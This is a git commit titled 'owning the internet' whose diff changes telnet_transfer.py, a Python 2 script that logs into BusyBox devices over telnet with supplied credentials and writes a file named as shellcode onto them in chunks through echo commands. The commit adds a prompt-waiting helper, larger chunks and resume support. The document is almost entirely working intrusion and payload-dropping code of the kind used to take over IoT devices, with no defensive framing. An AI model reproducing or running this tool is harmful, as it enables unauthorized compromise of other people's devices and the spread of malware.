414101e84da19dc593eb3c69e5b8b35106980664
Patrick Louis <patrick@iotek.org>
2016-02-24 14:06:19 +0200

    owning the internet

--- telnet_transfer.py
+++ telnet_transfer.py
@@ -4,7 +4,17 @@ import sys
 import telnetlib
 import time
 
-def try_telnet_send(host, port, username, password, shellcode, location, timeout):
+def magic_wait(hlr, wait_for_strings, write_what_after, timeout, log="nothing"):
+    print "waiting for "+log
+    login_prompt = hlr.expect(wait_for_strings, timeout)
+    if login_prompt[0] == -1:
+        hlr.close()
+        return False
+    print "got "+log
+    hlr.write(write_what_after+"\n")
+    return True
+
+def try_telnet_send(host, port, username, password, shellcode, location, timeout, chunk_reached=0):
     try:
         hlr = telnetlib.Telnet(host, port, timeout)
     except Exception, e:
@@ -12,41 +22,33 @@ def try_telnet_send(host, port, username, password, shellcode, location, timeout
         return False
     try:
         login_response = ""
-        print "waiting for login"
-        login_prompt = hlr.expect([r'USERCODE',r'usercode',r'login',
-                r'Login', r'LOGIN'], timeout)
-        if login_prompt[0] == -1:
-            hlr.close()
+        if not magic_wait(hlr, [r'USERCODE',r'usercode',r'login',r'Login', r'LOGIN'], username, timeout, "login"):
             return False
-        print "got login"
-        hlr.write(username+"\n")
-        print "waiting for password"
-        login_prompt = hlr.expect([r'password',r'Password',r'PASSWORD'], timeout)
-        if login_prompt[0] == -1:
-            hlr.close()
+        if not magic_wait(hlr, [r'password',r'Password',r'PASSWORD'], password, timeout, 'password'):
             return False
-        print "got password"
-        hlr.write(password+"\n")
-        print "waiting for busybox"
-        login_prompt = hlr.expect([r'BusyBox',r'busybox', 'Busybox', 'BUSYBOX'], timeout)
-        if login_prompt[0] == -1:
-            hlr.close()
+        if not magic_wait(hlr, [r'BusyBox',r'busybox', 'Busybox', 'BUSYBOX'], '', timeout, 'busybox'):
             return False
-
-        print "waiting for prompt"
-        login_prompt = hlr.expect(["\$"], timeout)
-        if login_prompt[0] == -1:
-            hlr.close()
+        if not magic_wait(hlr, [r'\$',r'#', '> $'], '', timeout, 'prompt'):
             return False
-
         print "writing bin"
         content = open(shellcode).read().rstrip()
-        for a in xrange(0, len(content), 300):
+        chunk_size = 600
+        delay = 1
+        for a in xrange(chunk_reached, len(content), chunk_size):
             print "sent split"
             print str(a)+"/"+str(len(content))
-            command = 'echo -e "'+content[a:a+300]+'" >> '+ location +'\n\n'
+            #try:
+            if not magic_wait(hlr, [r'\$',r'#', '> $'], '', timeout, 'prompt'):
+                return False
+            #command = 'busybox echo \'echo -ne "'+content[a:a+chunk_size]+'"\' >> '+ location +'\n'
+            command = 'busybox echo -ne "'+content[a:a+chunk_size]+'" >> '+ location +'\n'
             hlr.write(command)
-            time.sleep(0.3)
+            time.sleep(delay)
+            chunk_reached = a
+            #except Exception as e:
+            #    try_telnet_send(host, port, username, password, shellcode, location, timeout, chunk_reached)
+            #    return
+
         print "wrote hex"
         hlr.close()
         return True
@@ -56,4 +58,9 @@ def try_telnet_send(host, port, username, password, shellcode, location, timeout
         return False
 
 
-try_telnet_send(sys.argv[1], 23, sys.argv[2], sys.argv[3], sys.argv[4], sys.argv[5], 1000000)
+try:
+    try_telnet_send(sys.argv[1], 23, sys.argv[2], sys.argv[3], sys.argv[4], sys.argv[5], 10)
+except Exception as e:
+    print e
+    print " try_telnet_send(host, username, password, shellcode, location)"
+
